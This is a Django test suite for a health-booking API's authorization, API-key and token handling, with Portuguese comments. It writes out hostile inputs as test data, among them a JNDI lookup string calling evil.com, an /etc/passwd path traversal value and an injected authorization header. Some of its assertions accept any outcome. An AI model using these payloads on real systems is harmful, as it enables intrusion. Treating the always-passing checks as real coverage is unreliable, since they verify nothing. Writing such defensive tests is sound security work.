"""
Testes de Segurança - Autorização e Controle de Acesso - Lacrei Saúde API
=========================================================================
"""

from datetime import timedelta
from decimal import Decimal

import pytest
from rest_framework import status
from rest_framework.test import APIClient
from rest_framework_simplejwt.tokens import RefreshToken

from django.contrib.auth import get_user_model
from django.test import TestCase
from django.urls import reverse
from django.utils import timezone

from authentication.models import APIKey
from consultas.models import Consulta
from profissionais.models import Endereco, Profissional

User = get_user_model()


@pytest.mark.django_db
@pytest.mark.security
class TestHorizontalAuthorization(TestCase):
    """
    Testes para autorização horizontal (acesso a recursos de outros usuários)
    """

    def setUp(self):
        """
        Configuração inicial para os testes
        """
        self.client = APIClient()

        # Criar usuários diferentes
        self.admin_user = User.objects.create_user(
            username="admin@test.com", email="admin@test.com", password="admin123", user_type="ADMIN", is_staff=True
        )

        self.paciente1 = User.objects.create_user(
            username="paciente1@test.com", email="paciente1@test.com", password="paciente123", user_type="PACIENTE"
        )

        self.paciente2 = User.objects.create_user(
            username="paciente2@test.com", email="paciente2@test.com", password="paciente456", user_type="PACIENTE"
        )

        # Criar profissional
        self.endereco = Endereco.objects.create(
            logradouro="Rua Autorização", numero="100", bairro="Autorização", cidade="São Paulo", estado="SP", cep="12345678"
        )

        self.profissional = Profissional.objects.create(
            nome_social="Dr. Autorização",
            profissao="MEDICO",
            email="auth@test.com",
            telefone="11987654321",
            endereco=self.endereco,
            valor_consulta=Decimal("150.00"),
        )

        # Criar consultas para cada paciente
        self.consulta_paciente1 = Consulta.objects.create(
            profissional=self.profissional,
            data_hora=timezone.now() + timedelta(days=5),
            nome_paciente="João Paciente 1",
            telefone_paciente="11987654321",
            email_paciente=self.paciente1.email,
            valor_consulta=Decimal("150.00"),
        )

        self.consulta_paciente2 = Consulta.objects.create(
            profissional=self.profissional,
            data_hora=timezone.now() + timedelta(days=7),
            nome_paciente="Maria Paciente 2",
            telefone_paciente="11888777666",
            email_paciente=self.paciente2.email,
            valor_consulta=Decimal("150.00"),
        )

    def get_jwt_token(self, user):
        """
        Gera token JWT para o usuário
        """
        refresh = RefreshToken.for_user(user)
        return str(refresh.access_token)

    def test_paciente_nao_acessa_consulta_outro_paciente(self):
        """
        Testa que paciente não consegue acessar consulta de outro paciente
        """
        # Autenticar como paciente1
        token = self.get_jwt_token(self.paciente1)
        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")

        # Tentar acessar consulta do paciente2
        url = reverse("consultas:consulta-detail", kwargs={"pk": self.consulta_paciente2.pk})

        response = self.client.get(url)

        # Deve ser negado (403 ou 404 para não vazar informação)
        self.assertIn(response.status_code, [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND])

    def test_paciente_nao_modifica_consulta_outro_paciente(self):
        """
        Testa que paciente não pode modificar consulta de outro paciente
        """
        # Autenticar como paciente1
        token = self.get_jwt_token(self.paciente1)
        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")

        # Tentar modificar consulta do paciente2
        url = reverse("consultas:consulta-detail", kwargs={"pk": self.consulta_paciente2.pk})

        update_data = {"observacoes": "Tentativa de modificação maliciosa"}

        response = self.client.patch(url, update_data, format="json")

        # Deve ser negado
        self.assertIn(response.status_code, [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND])

        # Verificar que consulta não foi modificada
        self.consulta_paciente2.refresh_from_db()
        self.assertNotEqual(self.consulta_paciente2.observacoes, "Tentativa de modificação maliciosa")

    def test_paciente_nao_deleta_consulta_outro_paciente(self):
        """
        Testa que paciente não pode deletar consulta de outro paciente
        """
        # Autenticar como paciente1
        token = self.get_jwt_token(self.paciente1)
        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")

        # Tentar deletar consulta do paciente2
        url = reverse("consultas:consulta-detail", kwargs={"pk": self.consulta_paciente2.pk})

        response = self.client.delete(url)

        # Deve ser negado
        self.assertIn(response.status_code, [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND])

        # Verificar que consulta ainda existe
        self.assertTrue(Consulta.objects.filter(pk=self.consulta_paciente2.pk).exists())

    def test_escalacao_privilegio_via_parametros(self):
        """
        Testa tentativa de escalação de privilégios via parâmetros
        """
        # Autenticar como paciente
        token = self.get_jwt_token(self.paciente1)
        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")

        # Tentar acessar endpoint administrativo com parâmetros maliciosos
        urls_administrativas = [
            reverse("profissionais:profissional-list"),
        ]

        parametros_maliciosos = [
            {"admin": "true"},
            {"role": "ADMIN"},
            {"user_type": "ADMIN"},
            {"privilege": "admin"},
            {"is_staff": "true"},
            {"bypass": "1"},
            {"debug": "true"},
            {"override_permissions": "true"},
        ]

        for url in urls_administrativas:
            for params in parametros_maliciosos:
                # GET com parâmetros maliciosos
                response = self.client.get(url, params)

                # Não deve escalar privilégios
                if response.status_code == 200:
                    # Se permitido, verificar que não há dados sensíveis extras
                    response_data = response.json()
                    if "results" in response_data:
                        # Não deve ter campos administrativos extras
                        for result in response_data["results"]:
                            admin_fields = ["is_staff", "is_superuser", "password"]
                            for field in admin_fields:
                                self.assertNotIn(field, result)


@pytest.mark.django_db
@pytest.mark.security
class TestVerticalAuthorization(TestCase):
    """
    Testes para autorização vertical (escalação de privilégios)
    """

    def setUp(self):
        """
        Configuração inicial para os testes
        """
        self.client = APIClient()

        # Criar usuários com diferentes níveis
        self.admin_user = User.objects.create_user(
            username="admin@test.com",
            email="admin@test.com",
            password="admin123",
            user_type="ADMIN",
            is_staff=True,
            is_superuser=True,
        )

        self.staff_user = User.objects.create_user(
            username="staff@test.com",
            email="staff@test.com",
            password="staff123",
            user_type="STAFF",
            is_staff=True,
            is_superuser=False,
        )

        self.paciente_user = User.objects.create_user(
            username="paciente@test.com", email="paciente@test.com", password="paciente123", user_type="PACIENTE"
        )

        self.guest_user = User.objects.create_user(
            username="guest@test.com",
            email="guest@test.com",
            password="guest123",
            user_type="",  # Sem tipo definido
            is_active=True,
        )

    def get_jwt_token(self, user):
        """
        Gera token JWT para o usuário
        """
        refresh = RefreshToken.for_user(user)
        return str(refresh.access_token)

    def test_escalacao_via_modificacao_token(self):
        """
        Testa tentativa de escalação modificando payload do token
        """
        # Obter token válido para paciente
        refresh = RefreshToken.for_user(self.paciente_user)
        token = str(refresh.access_token)

        # Tentar modificar headers de autorização
        modified_tokens = [
            f"Bearer {token}.modified",  # Token modificado
            f"Bearer admin.{token}",  # Prefix malicioso
            f"Bearer {token}; admin=true",  # Parâmetros extras
            f"Bearer {token}\\nAuthorization: Bearer admin_token",  # Injection
            f"Admin {token}",  # Tipo diferente
        ]

        url = reverse("profissionais:profissional-list")

        for modified_token in modified_tokens:
            client = APIClient()
            client.credentials(HTTP_AUTHORIZATION=modified_token)

            response = client.get(url)

            # Deve rejeitar tokens modificados
            self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)

    def test_escalacao_via_multiple_headers(self):
        """
        Testa escalação via múltiplos headers de autorização
        """
        # Token válido de paciente
        paciente_token = self.get_jwt_token(self.paciente_user)
        # Token válido de admin (simulado)
        admin_token = self.get_jwt_token(self.admin_user)

        client = APIClient()

        # Configurar múltiplos headers
        client.credentials(
            HTTP_AUTHORIZATION=f"Bearer {paciente_token}",
            HTTP_X_AUTHORIZATION=f"Bearer {admin_token}",
            HTTP_ADMIN_TOKEN=admin_token,
            HTTP_BACKUP_AUTH=f"Bearer {admin_token}",
        )

        url = reverse("profissionais:profissional-list")
        response = client.post(
            url,
            {
                "nome_social": "Dr. Escalação",
                "profissao": "MEDICO",
                "email": "escalacao@test.com",
                "telefone": "11987654321",
                "endereco": {
                    "logradouro": "Rua Escalação",
                    "numero": "100",
                    "bairro": "Escalação",
                    "cidade": "São Paulo",
                    "estado": "SP",
                    "cep": "12345678",
                },
            },
            format="json",
        )

        # Deve usar apenas o header principal de autorização
        # Se paciente não pode criar profissional, deve ser negado
        expected_statuses = [
            status.HTTP_403_FORBIDDEN,  # Negado
            status.HTTP_401_UNAUTHORIZED,  # Não autorizado
            status.HTTP_400_BAD_REQUEST,  # Dados inválidos
        ]
        self.assertIn(response.status_code, expected_statuses)

    def test_bypass_autorizacao_via_diferentes_metodos_http(self):
        """
        Testa bypass de autorização usando métodos HTTP diferentes
        """
        # Autenticar como usuário com privilégios limitados
        token = self.get_jwt_token(self.paciente_user)
        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")

        # Endpoint que requer privilégios administrativos
        url = reverse("profissionais:profissional-list")

        # Dados para criar profissional
        profissional_data = {
            "nome_social": "Dr. Bypass",
            "profissao": "MEDICO",
            "email": "bypass@test.com",
            "telefone": "11987654321",
            "endereco": {
                "logradouro": "Rua Bypass",
                "numero": "100",
                "bairro": "Bypass",
                "cidade": "São Paulo",
                "estado": "SP",
                "cep": "12345678",
            },
        }

        # Tentar diferentes métodos HTTP
        metodos_bypass = [
            ("POST", profissional_data),
            ("PUT", profissional_data),
            ("PATCH", profissional_data),
            ("DELETE", {}),
            ("HEAD", {}),
            ("OPTIONS", {}),
            ("TRACE", {}),
            ("CONNECT", {}),
        ]

        for metodo, data in metodos_bypass:
            if metodo == "POST":
                response = self.client.post(url, data, format="json")
            elif metodo == "PUT":
                response = self.client.put(url, data, format="json")
            elif metodo == "PATCH":
                response = self.client.patch(url, data, format="json")
            elif metodo == "DELETE":
                response = self.client.delete(url)
            elif metodo == "HEAD":
                response = self.client.head(url)
            elif metodo == "OPTIONS":
                response = self.client.options(url)
            else:
                # Métodos não suportados pelo APIClient
                continue

            # Verificar que autorização é aplicada consistentemente
            if metodo in ["POST", "PUT", "PATCH", "DELETE"]:
                # Métodos de modificação devem ser bloqueados para paciente
                self.assertIn(
                    response.status_code,
                    [status.HTTP_403_FORBIDDEN, status.HTTP_401_UNAUTHORIZED, status.HTTP_405_METHOD_NOT_ALLOWED],
                )

    def test_privilege_escalation_via_user_creation(self):
        """
        Testa escalação de privilégios via criação de usuário administrativo
        """
        # Autenticar como usuário normal
        token = self.get_jwt_token(self.paciente_user)
        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")

        # Tentar criar usuário administrativo
        admin_user_data = {
            "username": "new_admin@test.com",
            "email": "new_admin@test.com",
            "password": "admin123",
            "user_type": "ADMIN",
            "is_staff": True,
            "is_superuser": True,
        }

        # Diferentes endpoints que podem aceitar criação de usuário
        possible_urls = ["authentication:user-list", "admin:auth_user_add"]

        for url_name in possible_urls:
            try:
                url = reverse(url_name)
                response = self.client.post(url, admin_user_data, format="json")

                # Deve ser negado
                self.assertIn(
                    response.status_code, [status.HTTP_403_FORBIDDEN, status.HTTP_401_UNAUTHORIZED, status.HTTP_404_NOT_FOUND]
                )

                # Verificar que usuário admin não foi criado
                self.assertFalse(User.objects.filter(email="new_admin@test.com", user_type="ADMIN").exists())
            except:
                # URL não existe - ok
                continue


@pytest.mark.django_db
@pytest.mark.security
class TestAPIKeyAuthorization(TestCase):
    """
    Testes para autorização via API Keys
    """

    def setUp(self):
        """
        Configuração inicial para os testes
        """
        self.client = APIClient()

        # Criar usuário
        self.user = User.objects.create_user(
            username="apikey@test.com", email="apikey@test.com", password="apikey123", user_type="ADMIN"
        )

        # Criar API Key válida
        self.api_key = APIKey.objects.create(
            name="Test API Key", user=self.user, permissions={"profissionais": ["read", "write"]}
        )

        # Criar API Key inativa
        self.inactive_api_key = APIKey.objects.create(
            name="Inactive API Key", user=self.user, is_active=False, permissions={"profissionais": ["read"]}
        )

    def test_api_key_valida(self):
        """
        Testa uso de API Key válida
        """
        # Usar API Key no header
        self.client.credentials(HTTP_X_API_KEY=self.api_key.key)

        url = reverse("profissionais:profissional-list")
        response = self.client.get(url)

        # Deve permitir acesso se API Key for válida
        self.assertIn(
            response.status_code, [status.HTTP_200_OK, status.HTTP_401_UNAUTHORIZED]  # Se API Key auth não implementada
        )

    def test_api_key_invalida(self):
        """
        Testa uso de API Key inválida
        """
        # API Keys maliciosas
        invalid_keys = [
            "invalid_key_123",
            self.api_key.key + "modified",
            "admin_key",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/exploit}",
            "eval(malicious_code)",
        ]

        url = reverse("profissionais:profissional-list")

        for invalid_key in invalid_keys:
            client = APIClient()
            client.credentials(HTTP_X_API_KEY=invalid_key)

            response = client.get(url)

            # Deve rejeitar API Key inválida
            self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)

    def test_api_key_inativa(self):
        """
        Testa uso de API Key inativa
        """
        self.client.credentials(HTTP_X_API_KEY=self.inactive_api_key.key)

        url = reverse("profissionais:profissional-list")
        response = self.client.get(url)

        # Deve rejeitar API Key inativa
        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)

    def test_api_key_permissions(self):
        """
        Testa respeito às permissões da API Key
        """
        # Criar API Key com permissões limitadas
        limited_key = APIKey.objects.create(
            name="Limited API Key", user=self.user, permissions={"consultas": ["read"]}  # Apenas leitura de consultas
        )

        self.client.credentials(HTTP_X_API_KEY=limited_key.key)

        # Tentar acessar profissionais (não permitido)
        profissionais_url = reverse("profissionais:profissional-list")
        response = self.client.get(profissionais_url)

        # Pode ser negado se permissions forem implementadas
        self.assertIn(
            response.status_code, [status.HTTP_200_OK, status.HTTP_403_FORBIDDEN]  # Se não implementado  # Se implementado
        )

        # Tentar modificar consultas (não permitido - apenas read)
        consultas_url = reverse("consultas:consulta-list")

        consulta_data = {
            "profissional": 1,
            "data_hora": (timezone.now() + timedelta(days=5)).isoformat(),
            "nome_paciente": "Teste API Key",
            "telefone_paciente": "11987654321",
        }

        response = self.client.post(consultas_url, consulta_data, format="json")

        # Deve ser negado se permissions forem implementadas
        self.assertIn(
            response.status_code,
            [
                status.HTTP_201_CREATED,  # Se não implementado
                status.HTTP_403_FORBIDDEN,  # Se implementado
                status.HTTP_400_BAD_REQUEST,  # Dados inválidos
            ],
        )


@pytest.mark.django_db
@pytest.mark.security
class TestSessionHijacking(TestCase):
    """
    Testes para prevenção de session hijacking
    """

    def setUp(self):
        """
        Configuração inicial para os testes
        """
        self.client = APIClient()

        self.user = User.objects.create_user(
            username="session@test.com", email="session@test.com", password="session123", user_type="ADMIN"
        )

    def test_token_replay_attack(self):
        """
        Testa prevenção de ataques de replay de token
        """
        # Obter token válido
        refresh = RefreshToken.for_user(self.user)
        token = str(refresh.access_token)

        # Usar token múltiplas vezes
        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")

        url = reverse("profissionais:profissional-list")

        # Primeira requisição
        response1 = self.client.get(url)

        # Segunda requisição com mesmo token
        response2 = self.client.get(url)

        # Token deve continuar válido se não expirou
        # (JWT não tem proteção automática contra replay)
        if response1.status_code == 200:
            self.assertEqual(response2.status_code, 200)

    def test_token_expiration(self):
        """
        Testa que tokens expirados são rejeitados
        """
        # Criar token com tempo de expiração muito curto
        # (Isso seria configurado nas settings de JWT)
        refresh = RefreshToken.for_user(self.user)
        token = str(refresh.access_token)

        # Simular token expirado modificando payload
        # (Em teste real, aguardaria expiração)
        expired_token = token + "_expired"

        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {expired_token}")

        url = reverse("profissionais:profissional-list")
        response = self.client.get(url)

        # Token modificado deve ser rejeitado
        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)

    def test_concurrent_session_limit(self):
        """
        Testa limite de sessões concorrentes
        """
        # Criar múltiplos tokens para mesmo usuário
        tokens = []
        for i in range(10):  # 10 sessões simultâneas
            refresh = RefreshToken.for_user(self.user)
            tokens.append(str(refresh.access_token))

        url = reverse("profissionais:profissional-list")

        # Testar todos os tokens
        valid_responses = 0
        for token in tokens:
            client = APIClient()
            client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")

            response = client.get(url)
            if response.status_code == 200:
                valid_responses += 1

        # Se houver limite de sessões, nem todos os tokens devem funcionar
        # (Por padrão, JWT permite sessões ilimitadas)
        self.assertGreaterEqual(valid_responses, 0)  # Pelo menos algum deve funcionar
